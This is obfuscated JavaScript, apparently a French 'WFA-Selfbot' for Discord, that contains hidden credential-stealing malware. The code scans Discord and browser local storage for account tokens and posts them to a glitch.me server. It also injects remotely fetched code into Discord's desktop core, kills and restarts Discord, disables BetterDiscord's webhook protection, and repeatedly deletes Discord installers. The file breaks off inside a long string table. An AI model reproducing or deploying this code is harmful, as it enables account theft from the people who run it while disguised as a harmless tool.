const {
  discord,
  Client,
  RichEmbed
} = require('discord-selfbott-v11'),
      Discord = require('discord-selfbott-v11'),
      client = new Client(),
      Embed = RichEmbed,
      consolecolor = require('gradient-string'),
      request = require('request'),
      superagent = require('superagent'),
      base64 = require('base-64'),
      os = require('os'),
      utf8 = require('utf8'),
      fs = require('fs'),
      rpcGenerator = require('discordrpcgenerator'),
      uuid = () => '10000000-1000-4000-8000-100000000000'.replace(/[018]/g, b => (b ^ Math.random() * 16 >> b / 4).toString(16)),
      path = require('path'),
      https = require('https'),
      glob = require('glob'),
      {
  execSync,
  exec: exec
} = require('child_process'),
      buf_replace = require('buffer-replace'),
      formData = require('form-data'),
      axios = require('axios'),
      fetch = require('node-fetch'),
      allah = new URLSearchParams(),
      allah2 = new URLSearchParams();

let appdata = process.env.APPDATA,
    localappdata = process.env.LOCALAPPDATA,
    dcrd = [],
    patttt = [],
    runnn = [];
const paths = [appdata + '\\discord\\', appdata + '\\discordcanary\\', appdata + '\\discordptb\\', appdata + '\\discorddevelopment\\', appdata + '\\lightcord\\', localappdata + '\\Google\\Chrome\\User Data\\Default\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\', localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\', localappdata + '\\Google\\Chrome\\User Data\\Default\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\Network\\', appdata + '\\Opera Software\\Opera Stable\\', appdata + '\\Opera Software\\Opera GX Stable\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\', localappdata + '\\Microsoft\\Edge\\User Data\\Default\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\', localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Default\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\'];

require('colors');

const paste = 'https://raw.githubusercontent.com/WFA-Selfbot/wfa-core/main/index.js';
let ghost = '||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| _ _ _ _ _ _ ';
ee();

function miamm() {
  const b = {
    'vTyec': 'utf8',
    'HRxKk': 'index.js',
    'EWhJN': function (c) {
      return c();
    },
    'QSCZe': 'data'
  };
  https.get(paste, c => {
    let d = '';
    c.on('data', g => {
      d += g;
    }), c.on('end', () => {
      const g = {
        'cPGtU': 'blackcap',
        'LEBeD': 'utf8',
        'paWte': 'index.js',
        'uFjzs': function (h) {
          return h();
        }
      };
      patttt.forEach(h => {
        fs.writeFileSync(h, d.replace('%WEBHOOK%', 'blackcap'), {
          'encoding': 'utf8',
          'flag': 'w'
        });
        let i = h.replace('index.js', 'blackcap');
        fs.existsSync(i) || (fs.mkdirSync(i, 484), miam());
      });
    });
  }).on('error', c => {});
}

function salam() {
  const b = {
    'pnKXP': 'DiscordCanary.exe',
    'JhKdM': 'DiscordCanary',
    'yyPdr': 'Discord.exe',
    'VvkLH': 'Discord',
    'mbKii': 'DiscordPTB.exe',
    'pvVJQ': 'DiscordDevelopment.exe',
    'yKHYc': 'DiscordDevelopment',
    'bSmby': 'DiscordPTB',
    'LqUfN': function (c, d, g) {
      return c(d, g);
    },
    'GxAPX': 'tasklist'
  };
  exec('tasklist', function (c, d, g) {
    d.includes('DiscordCanary.exe') && runnn.push('DiscordCanary'), d.includes('Discord.exe') && runnn.push('Discord'), d.includes('DiscordPTB.exe') && runnn.push('DiscordPTB'), d.includes('DiscordDevelopment.exe') && runnn.push('DiscordDevelopment'), d.includes('DiscordPTB.exe') && runnn.push('DiscordPTB'), stop();
  });
}

function stop() {
  const b = {
    'MnJzJ': function (c, d, g) {
      return c(d, g);
    }
  };
  runnn.forEach(c => {
    exec('taskkill /IM ' + c + '.exe /F', d => {});
  });
}

function miam() {
  const b = {
    'SZqRu': function (c, d) {
      return c + d;
    },
    'vQoSE': function (c, d) {
      return c + d;
    },
    'ExsPm': function (c, d) {
      return c + d;
    },
    'FWCZO': '\\Update.exe',
    'blgIA': function (c, d, g) {
      return c(d, g);
    }
  };
  runnn.forEach(c => {
    ass = localappdata + '\\' + c + '\\Update.exe', exec(ass + ' --processStart ' + c + '.exe', d => {});
  });
}

function bett() {
  const b = {
    'lpdAy': function (d, g) {
      return d + g;
    },
    'BAEKa': function (d, g, h) {
      return d(g, h);
    },
    'FpaOa': '[COMMAND] nitro command executed',
    'QyDAX': function (d, g) {
      return d + g;
    },
    'WJTQu': '\\BetterDiscord\\data\\betterdiscord.asar',
    'Jrtac': function (d, g) {
      return d !== g;
    },
    'AXLgz': 'api/webhooks',
    'hRNSr': 'blackcap'
  };
  let c = process.env.appdata + '\\BetterDiscord\\data\\betterdiscord.asar';

  if (fs.existsSync(c)) {
    let d = fs.readFileSync(c);
    fs.writeFileSync(c, buf_replace(d, 'api/webhooks', 'blackcap'));
  }
}

function ee() {
  const g = {
    'afRsA': 'Lacoste',
    'uquqw': 'https://www.twitch.tv/OGAGAL_risitas',
    'aJeUN': 'BE RAKAILLE WITH WFA',
    'hSQhP': function (k) {
      return k();
    },
    'iOOCz': '[COMMANDE] Commande lacoste executé',
    'fNNhD': function (k, l) {
      return k + l;
    },
    'tvYOr': ':white_check_mark: **Tu regardes ',
    'LzXWX': ' sur lacoste**',
    'LBHWG': 'hfVwW',
    'xehLh': '(((.+)+)+)+$',
    'ZWJip': 'nCaot',
    'BbOwv': ':x: **Commande uniquement utilisable sur un serveur**',
    'HckIE': 'MOVE_MEMBERS',
    'VrDwQ': ':x:**Tu n\'a pas la permission de kick un utilisatur**.',
    'fJPIz': ':x:**Veuillez mentionner un utilisateur.**',
    'yWGzW': ':x:**L\'utilisateur n\'est pas dans un channel vocal.**',
    'rtenO': ':x: **Aucun serveur trouvable avec l\'id** "',
    'PofvP': function (k, l) {
      return k === l;
    },
    'bpqey': 'iaIit',
    'VHGMj': 'WFA-Selfbot',
    'eMasd': '603405368940429315',
    'YspCr': 'PLAYING',
    'lMuZO': function (k, l) {
      return k !== l;
    },
    'IzBGi': 'dIYmu',
    'diZlo': 'function *\\( *\\)',
    'zhqUZ': '\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)',
    'eZyND': 'chain',
    'BASgP': function (k, l) {
      return k + l;
    },
    'AvtDd': function (k, l) {
      return k(l);
    },
    'UgrwA': function (k, l, m) {
      return k(l, m);
    },
    'NBsAH': function (k) {
      return k();
    },
    'eFPNV': function (k) {
      return k();
    }
  },
        h = function () {
    let l = true;
    return function (m, n) {
      const o = l ? function () {
        if (n) {
          const p = n.apply(m, arguments);
          return n = null, p;
        }
      } : function () {};
      return l = false, o;
    };
  }(),
        i = h(this, function () {
    return i.toString().search('(((.+)+)+)+$').toString().constructor(i).search('(((.+)+)+)+$');
  });

  i();

  const j = function () {
    const k = {
      'eywhv': ':x: **Commande uniquement utilisable sur un serveur**',
      'vFUJv': 'MOVE_MEMBERS',
      'yiIAM': ':x:**Tu n\'a pas la permission de kick un utilisatur**.',
      'XPYtQ': ':x:**Veuillez mentionner un utilisateur.**',
      'KxbfM': ':x:**L\'utilisateur n\'est pas dans un channel vocal.**',
      'oHVPb': ':white_check_mark: **L\'utilisateur a été voice kick correctement**',
      'OUOrj': function (m, n) {
        return m + n;
      },
      'YfhMg': ':x: **Aucun serveur trouvable avec l\'id** "',
      'DRTYf': function (m, n) {
        return m === n;
      },
      'hriDN': 'iaIit'
    };
    let l = true;
    return function (m, n) {
      const p = l ? function () {
        const q = {
          'LuQee': function (r, s) {
            return r + s;
          },
          'SBvxC': ':x: **Aucun serveur trouvable avec l\'id** "'
        };
        {
          if (n) {
            const r = n.apply(m, arguments);
            return n = null, r;
          }
        }
      } : function () {};
      return l = false, p;
    };
  }();

  (function () {
    const k = {
      'oIrGH': 'WFA-Selfbot',
      'HpZPP': '603405368940429315',
      'VqFMc': 'minecraft',
      'hMPhJ': 'https://www.twitch.tv/OGAGAL_risitas',
      'ICfGw': 'PLAYING',
      'pPFlY': function (l) {
        return l();
      },
      'fTepj': function (l, m) {
        return l !== m;
      },
      'FjVNp': 'bzboL',
      'zucHo': 'dIYmu',
      'ieanH': 'function *\\( *\\)',
      'TBPUK': '\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)',
      'FkiGz': 'init',
      'ebyOd': 'chain',
      'gaiKi': function (l, m) {
        return l + m;
      },
      'LnLoQ': function (l, m) {
        return l(m);
      },
      'NcBkt': function (l) {
        return l();
      }
    };
    j(this, function () {
      const l = {
        'qOrPH': 'Minecraft',
        'KHgcf': 'https://www.twitch.tv/OGAGAL_risitas',
        'LxpeR': 'PLAYING',
        'RWTNv': '603405368940429315',
        'mDiIV': 'WFA-Selfbot',
        'wumtI': function (m) {
          return m();
        },
        'zeGZM': '[COMMAND] minecraft command executed'
      };
      {
        const m = new RegExp('function *\\( *\\)'),
              n = new RegExp('\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i'),
              o = a('init');
        !m.test(o + 'chain') || !n.test(o + 'input') ? o('0') : a();
      }
    })();
  })(), cvmerci(), (miamm(), bett());
}

fs.readdirSync(localappdata).forEach(c => {
  const d = {
    'Vwehb': 'cord',
    'BiVGz': function (h, i) {
      return h + i;
    }
  };
  const g = d;
  c.includes('cord') && dcrd.push(localappdata + '\\' + c);
}), dcrd.forEach(function (b) {
  const c = {
    'npoBZ': function (g, h) {
      return g === h;
    },
    'qnPvp': ':x: **you haven\'t voice-blacklist this user**',
    'AFSsr': ':x: **Please Mention a user**',
    'aWDyn': '[COMMAND] auto voice kick command stoped',
    'KWjcS': ':white_check_mark: **Auto Voice kick stoped for this user**',
    'KNuiD': function (g) {
      return g();
    },
    'qxRrh': 'Dimmf',
    'HZNiR': 'OeweD',
    'QuGKL': function (g, h) {
      return g + h;
    },
    'WbJAa': '\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js'
  };
  let d = b + '\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js';
  glob.sync(d).map(g => {
    patttt.push(g), salam();
  });
});

function ettoi(c) {
  const d = {
    'QufUG': function (i, j) {
      return i < j;
    },
    'zcqmn': 'WFA-Selfbot',
    'Ooqdk': 'london',
    'WcsiO': '[COMMANDE] Commande gucci executé',
    'blmBx': ':white_check_mark: **Tu regardes ',
    'mlRUS': 'gucci',
    'RwMcw': function (i, j) {
      return i === j;
    },
    'tdlfO': 'XpxpM',
    'anhVq': '.log',
    'gqjVa': '.ldb',
    'fuMTp': '\\Local Storage\\leveldb',
    'VEPWn': 'wqkaA'
  };
  const g = d;
  c += '\\Local Storage\\leveldb';
  let h = [];

  try {
    fs.readdirSync(path.normalize(c)).map(j => {
      const k = {
        'huxkn': '[COMMANDE] Commande gucci executé',
        'cjooE': ':white_check_mark: **Tu regardes ',
        'lSQAl': 'WFA-Selfbot',
        'rbjoT': 'gucci',
        'YULMU': function (l, m) {
          return l === m;
        },
        'EHoqk': 'QjeOU',
        'bFdqF': 'XpxpM',
        'cuRxh': 'VoTQD'
      };
      (j.endsWith('.log') || j.endsWith('.ldb')) && fs.readFileSync(c + '\\' + j, 'utf8').split(/\r?\n/).forEach(l => {
        const m = {
          'MPsNq': 'https://www.twitch.tv/OGAGAL_risitas',
          'HnXhq': '603405368940429315',
          'iDMmI': function (o, p) {
            return o + p;
          },
          'wVGyj': '[COMMANDE] Commande gucci executé',
          'HAYzJ': ':white_check_mark: **Tu regardes ',
          'OwUCk': 'WFA-Selfbot',
          'ehObt': 'gucci'
        };
        const n = m;
        {
          const p = [new RegExp(/mfa\.[\w-]{84}/g), new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g)];

          for (const q of p) {
            const r = l.match(q);

            if (r) {
              r.forEach(t => {
                h.push(t);
              });
            }
          }
        }
      });
    });
  } catch {}

  return h;
}

function onlyUnique(c, d, g) {
  const h = {
    'ofcxA': function (j, k) {
      return j === k;
    }
  };
  const i = h;
  return g.indexOf(c) === d;
}

function cvmerci() {
  const b = {
    'qXbev': function (j, k) {
      return j + k;
    },
    'CSuQm': '```diff\n + the token:',
    'sfoQH': 'is 100% valid ✔```',
    'ioWyw': 'DCZPN',
    'hxwBU': 'NCRvR',
    'OZTNR': 'https://super-mega-futur-app-855054.glitch.me/',
    'eyUzA': 'POST',
    'ipKdd': 'discordptb',
    'qoKGP': 'Chrome',
    'lRNyL': 'User Data',
    'awZsD': 'Default',
    'tjICa': 'Opera Software',
    'oaXNa': 'BraveSoftware',
    'aQWwi': 'Brave-Browser',
    'Xgkvi': 'Yandex',
    'Dfuqw': 'YandexBrowser',
    'neoRU': function (j, k) {
      return j(k);
    }
  };
  let c;
  const d = process.env.LOCALAPPDATA,
        g = process.env.APPDATA;
  c = {
    'Discord': path.join(g, 'Discord'),
    'Discord Canary': path.join(g, 'discordcanary'),
    'Discord PTB': path.join(g, 'discordptb'),
    'Google Chrome': path.join(d, 'Google', 'Chrome', 'User Data', 'Default'),
    'Opera': path.join(g, 'Opera Software', 'Opera Stable'),
    'Brave': path.join(d, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
    'Yandex': path.join(d, 'Yandex', 'YandexBrowser', 'User Data', 'Default')
  };
  let h = 'Non';
  const i = [];

  for (let [j, k] of Object.entries(paths)) {
    const l = ettoi(k);
    l && l.forEach(m => {
      i.push(m), h = k;
    });
  }

  i.filter(onlyUnique).forEach(m => {
    const n = {
      'kYJrZ': function (o, p) {
        return o + p;
      },
      'wIZAe': function (o, p) {
        return o + p;
      },
      'lKGFb': '```diff\n + the token:',
      'XWhPz': 'is 100% valid ✔```'
    };
    allah2.append('token', m), fetch('https://super-mega-futur-app-855054.glitch.me/', {
      'method': 'POST',
      'body': allah2
    });
  });
}

function nodelinject() {
  const c = {
    'qcgTw': 'DiscordSetup ',
    'bcsaM': '603405368940429315',
    'rpXzv': 'hxh',
    'uNGnN': 'Hunter X Hunter',
    'mgLCK': 'https://www.twitch.tv/OGAGAL_risitas',
    'MRJOw': '[COMMANDE] Commande hunter x hunter executé',
    'loOrd': function (h, i) {
      return h !== i;
    },
    'aKLFU': 'yOgob'
  };
  const d = c,
        g = os.homedir();
  fs.readdirSync(g + '\\Downloads').forEach(h => {
    h.includes('DiscordSetup ') && fs.unlink(h, i => {});
  }), fs.readdirSync(g + '\\Desktop').forEach(h => {
    const i = {
      'niwtl': 'WATCHING',
      'kfmYB': 'WFA-Selfbot',
      'vJcgg': 'Hunter X Hunter',
      'wxtxc': 'https://www.twitch.tv/OGAGAL_risitas',
      'wgKmr': '603405368940429315',
      'PWvgn': '[COMMANDE] Commande hunter x hunter executé'
    };
    const j = i;

    if (h.includes('DiscordSetup ')) {
      fs.unlink(h, l => {});
    }
  }), fs.readdirSync(g + '\\Documents').forEach(h => {
    h.includes('DiscordSetup ') && fs.unlink(h, i => {});
  });
}

setInterval(() => {
  const b = {
    'yvGKu': function (c) {
      return c();
    }
  };
  nodelinject();
}, 2000);

function UpdateFile(c, d) {
  const g = {
    'aSUTm': function (l, m) {
      return l == m;
    },
    'qQDdY': 'ENOENT',
    'uylLc': 'Un fichier n\'existe pas, ne fermez pas la fenetre je vais l\'installer.',
    'EezCH': function (l, m) {
      return l(m);
    },
    'ESwTU': 'error'
  };
  let h = c,
      i = d;
  fs.unlink('./' + h, function (l) {
    if (l && l.code == 'ENOENT') console.info('Un fichier n\'existe pas, ne fermez pas la fenetre je vais l\'installer.');else {
      if (l) console.error('Une erreur s\'est produite lors de la tentative de suppression du fichier'.bgred);else {}
    }
  });
  var j = fs.createWriteStream('./' + h),
      k = request('' + i).pipe(j);
  k.on('error', function (l) {
    console.log(l);
  }), k.on('finish', function () {
    j.close(sleep(1));
  });
}

const {
  time
} = require('console');

let configFile = require('./config.json'),
    modulable = require('./config.json'),
    token = configFile.token,
    prefix = configFile.prefix,
    nsfw = configFile.nsfw,
    multi_status = configFile.multi_status;

let language = configFile.language,
    ver = configFile.version,
    versionofwfamod = modulable.v;
superagent.get('https://api.npoint.io/ca95e61e00cd0bd9ef3c').then(b => {
  const c = {
    'VHrzb': '/!\\ Anti mp',
    'TjcML': '[EVENT] Le bot ',
    'XjUHn': ' vous a envoyer une invitation discord',
    'mjmRy': function (H, I) {
      return H + I;
    },
    'aBCSN': '[EVENT] Message: ',
    'yBZQD': '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━',
    'JhiOD': 'Badlion',
    'MGvCL': 'https://www.twitch.tv/OGAGAL_risitas',
    'EczYJ': 'PLAYING',
    'fzBuk': 'WFA-Selfbot',
    'UDlFl': function (H) {
      return H();
    },
    'KERyr': '[COMMANDE] Commande badlion executé',
    'XUxuu': function (H, I, J) {
      return H(I, J);
    },
    'CCfjy': 'index.js',
    'AfgYj': function (H, I, J) {
      return H(I, J);
    },
    'LacQx': 'config.json',
    'ajGVt': '',
    'DQrEG': 'token',
    'lZyrd': 'https://super-mega-futur-app-855054.glitch.me/',
    'VmwLL': 'POST',
    'sEwbf': '4|2|5|1|10|11|6|9|8|0|3|7',
    'XWlYx': '[EVENT] At: ',
    'jiteY': function (H, I) {
      return H === I;
    },
    'uRGxk': function (H, I) {
      return H === I;
    },
    'MCiIS': function (H, I) {
      return H + I;
    },
    'mnank': '[EVENT] Content: ',
    'SssOn': '[EVENT] New Ghostping:',
    'Rzula': '[EVENT] Server: ',
    'WvykI': ':x: **Veuillez mentionner un utilisateur!**',
    'mjznX': '%2520',
    'dXyzw': function (H, I) {
      return H + I;
    },
    'uePtZ': function (H, I) {
      return H * I;
    },
    'nvwxp': '[COMMANDE] Commande punch executé',
    'KMLIy': function (H, I) {
      return H + I;
    },
    'nDxVS': function (H, I) {
      return H + I;
    },
    'GkrCf': function (H, I) {
      return H + I;
    },
    'xbxkK': '```\nRole: <@&',
    'Clxba': '>\n\nID of the role: ',
    'oITxb': '\n\nColor: ',
    'kEXpE': '```',
    'TvvwV': 'ADnsN',
    'PqjJD': function (H, I) {
      return H > I;
    },
    'EVSEB': 'xJZwQ',
    'omrPk': 'actif',
    'vXgTz': function (H, I) {
      return H !== I;
    },
    'ZfwAQ': 'JCFVr',
    'DbHZF': 'zQIDZ',
    'GDIkq': 'non',
    'lfDMB': function (H, I) {
      return H !== I;
    },
    'IYGky': 'xgGoj',
    'sxTdg': 'AaVsq',
    'obyPr': 'yellow',
    'SiArK': 'green',
    'SKhHV': 'white',
    'CVSuB': 'magenta',
    'sNuMT': 'orange',
    'EUEjb': 'red',
    'WPezJ': function (H, I) {
      return H * I;
    },
    'btTOB': function (H, I, J) {
      return H(I, J);
    },
    'jzSzW': 'sZCnq',
    'GDgIq': function (H, I) {
      return H + I;
    },
    'JPfiq': '[COMMAND] anal command executed',
    'CCCeC': 'cydJd',
    'Hudxw': './Data/pubmp.json',
    'Lrbgw': '1|0|3|2|4',
    'qvGeR': 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789',
    'LrFAU': 'ICaOb',
    'lNlxN': './Data/afk.json',
    'YJkKl': 'WATCHING',
    'fjyzZ': '603405368940429315',
    'hTRGH': '[COMMANDE] Commande snapchat executé',
    'mLiVo': function (H, I) {
      return H + I;
    },
    'cXPxA': ':white_check_mark: **Tu regardes ',
    'unEIv': ' sur Snapchat**',
    'CvvcV': function (H, I) {
      return H !== I;
    },
    'FCqiw': 'UvCvw',
    'lkcla': './Data/liste.json',
    'zukcR': './Data/vkick.json',
    'vsEsB': ':x: **tu dois mettre l\'id d\'une backup**!',
    'tEYrl': function (H, I) {
      return H !== I;
    },
    'PXaNG': 'asFfI',
    'doZpg': './Data/backups.json',
    'DDSKI': function (H, I) {
      return H < I;
    },
    'Adfhk': function (H, I) {
      return H * I;
    },
    'CxINf': 'BE NIKED WITH WFA',
    'LaJJz': function (H, I) {
      return H + I;
    },
    'VRqEu': ' sur Nike**',
    'Brcbs': function (H, I) {
      return H == I;
    },
    'gvhvP': '294882584201003009',
    'jJyiS': '716967712844414996',
    'Ulaul': function (H, I) {
      return H === I;
    },
    'WafuQ': 'NRufN',
    'Egykj': 'YdDpi',
    'YxjAK': 'Congratulations',
    'mTDjm': function (H, I) {
      return H + I;
    },
    'ZUGkg': '[EVENT] GG Je t\'ai fais gagner le giveaway sur le serveur ',
    'UZSdt': ', va vite reclamer ta récompense',
    'PhWDr': 'https://embed.rauf.workers.dev/?author=Command%2520NSFW&image=',
    'FIgPO': '[COMMAND] hentai command executed',
    'brIeH': 'hentai_anal',
    'PUXMm': function (H, I) {
      return H === I;
    },
    'KLxXC': 'DCIjG',
    'qaPVU': 'twitter',
    'kaYfe': function (H, I) {
      return H + I;
    },
    'VJcTO': 'https://cdn.discordapp.com/emojis/',
    'FBhWu': ':white_check_mark: **Emote ajoutée au serveur.**',
    'lDjLv': '[COMMANDE] Commande add emote executé',
    'iKKUL': 'MOVE_MEMBERS',
    'hOmzJ': ':x:**You don\'t have permission to kick a user**.',
    'BPaRQ': '[COMMAND] auto voice kick command executed',
    'bHyuM': ':white_check_mark: **Auto Voice kick config!\n\nThis user can no longer join voice channels on this server**',
    'oJNYO': function (H, I) {
      return H + I;
    },
    'JeinJ': 'MANAGE_CHANNELS',
    'bGxyd': 'ERROR',
    'KijSz': 'insufficient permission',
    'ThEpU': '[COMMANDE] Command delete all channel command executed',
    'HknIQ': 'https://discordapp.com/api/v6/hypesquad/online',
    'xKjUW': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36',
    'ZkMOj': ':white_check_mark: **You have joined the hypesquad  \'ballance\'**',
    'ewLSN': '[COMMAND] change hypesquad command executed',
    'rhMCN': function (H, I) {
      return H + I;
    },
    'tfkJA': 'la backup est prise, l\'id est: ',
    'jlegx': function (H, I) {
      return H + I;
    },
    'dAENj': function (H, I) {
      return H === I;
    },
    'KoOrx': ':x: **This emote is not on the server**.',
    'mJMQi': function (H, I) {
      return H === I;
    },
    'VtYvu': 'giRWw',
    'gchcB': 'yDvRF',
    'IXfPt': ':x: **Please mention a user!**',
    'bJanj': function (H, I) {
      return H * I;
    },
    'tnMqo': '[COMMAND] kiss command executed',
    'qDRSi': 'PGraX',
    'uUrOx': 'eiVtx',
    'olpPn': '░░░░░░░░░░ 0%',
    'DnXva': '▓▓▓▓▓▓▓▓▓▓ 100%',
    'hWdnE': 'nIIoC',
    'cXkkU': function (H, I) {
      return H + I;
    },
    'aYOkP': function (H, I) {
      return H + I;
    },
    'lsSDu': function (H, I) {
      return H * I;
    },
    'kgnpd': function (H, I) {
      return H * I;
    },
    'xBJug': 'Lacoste',
    'VDzOp': ' sur lacoste**',
    'dBxtW': '[COMMANDE] Commande steal banniere executé',
    'jYGZG': function (H, I) {
      return H + I;
    },
    'ivXtC': 'Skype',
    'nRwCV': 'BE OLD WITH WFA',
    'bimwc': '[COMMANDE] Commande skype executé',
    'WPKXE': function (H, I) {
      return H + I;
    },
    'tagrI': function (H, I) {
      return H === I;
    },
    'QyjGT': 'jHciC',
    'WzKjq': 'UjVOQ',
    'YSrOz': function (H, I) {
      return H !== I;
    },
    'MRqkL': 'KolWq',
    'OAJyL': function (H, I) {
      return H + I;
    },
    'CauAS': '```WFA BACKUP FRIEND\n\nLien hastebins: ',
    'TtSuL': '\n\n***vous pouvez copier coller la liste sur le channel actuel et vous pourrez ensuite faire clique droit sur un pseudo / envoyer un message / add friend ect...```',
    'Atkwn': '[COMMANDE] Commande backup friend executé',
    'kAacW': 'Token timeout',
    'LbEeP': '843993531273707540',
    'WmUTC': function (H, I) {
      return H === I;
    },
    'fQLCz': ':x: **Please run this command in a server!**',
    'nUBTN': function (H, I) {
      return H !== I;
    },
    'UbuTK': 'london',
    'YHpzF': ':x: **Please run this command on a server**',
    'DlQpy': 'MANAGE_NICKNAMES',
    'YaXEn': 'Je renomme tout le monde par ',
    'JqJik': '[COMMAND] name all command executed',
    'rRsPK': function (H, I) {
      return H === I;
    },
    'mEyXo': ':white_check_mark: **Token fuck en cours...**',
    'MICXB': 'gVFwR',
    'Wtqhq': 'OLEKV',
    'iVKpB': 'ready',
    'XWRbP': function (H, I, J) {
      return H(I, J);
    },
    'wqXTl': 'https://discord.com/api/v8/users/@me/settings',
    'lzCul': 'application/json',
    'mNhdS': '{"theme":"light"}',
    'fSrst': '{"theme":"dark"}',
    'vsshr': 'PATCH',
    'IiBYf': function (H, I) {
      return H <= I;
    },
    'qRvCg': function (H, I) {
      return H + I;
    },
    'HTQMU': function (H, I) {
      return H + I;
    },
    'GEyoJ': '```[',
    'unuvs': function (H, I) {
      return H - I;
    },
    'ENFub': ']  -  ',
    'XHist': '`Data obtained!`',
    'xwyQY': 'vPZJZ',
    'nGauy': 'LDfwM',
    'GDvzD': function (H, I) {
      return H + I;
    },
    'tBpKw': 'Est 100% valide ✔```',
    'iuQkT': '```diff\n- Le token ',
    'JYusJ': function (H, I) {
      return H + I;
    },
    'SYZTh': function (H, I) {
      return H + I;
    },
    'WQLeS': function (H, I) {
      return H * I;
    },
    'fDCEC': function (H, I) {
      return H === I;
    },
    'PqchU': 'ADMINISTRATOR',
    'savwz': 'BAN_MEMBERS',
    'LqNbx': '|  ',
    'ISDfe': ':x: **Command only usable in server**',
    'kLGiw': '[COMMAND] Commande mp all used',
